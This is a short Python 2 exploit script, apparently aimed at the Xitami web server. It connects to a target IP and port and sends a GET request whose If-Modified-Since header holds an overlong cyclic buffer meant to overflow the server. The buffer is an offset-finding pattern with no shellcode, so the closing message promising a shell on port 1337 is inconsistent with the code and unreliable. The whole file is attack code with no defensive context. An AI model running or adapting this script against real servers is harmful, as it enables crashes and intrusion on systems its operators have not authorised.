import time
import socket
import sys

if len(sys.argv) != 3:
    print "Usage: ./xitami.py <Target IP> <Target Port>"
    sys.exit(1)

target = sys.argv[1]
port = int(sys.argv[2])

buf = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9"

header = (
'GET / HTTP/1.1\r\n'
'Host: %s\r\n'
'If-Modified-Since: pwned, %s\r\n'
'\r\n') % (target, buf)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.connect((target, port))
    print "[+] Connected"
except:
    print "[!] Connection Failed"
    sys.exit(0)

print "[+] Sending payload..."
s.send(header)
time.sleep(1)
s.close()

print "[+] Check port 1337 for your shell"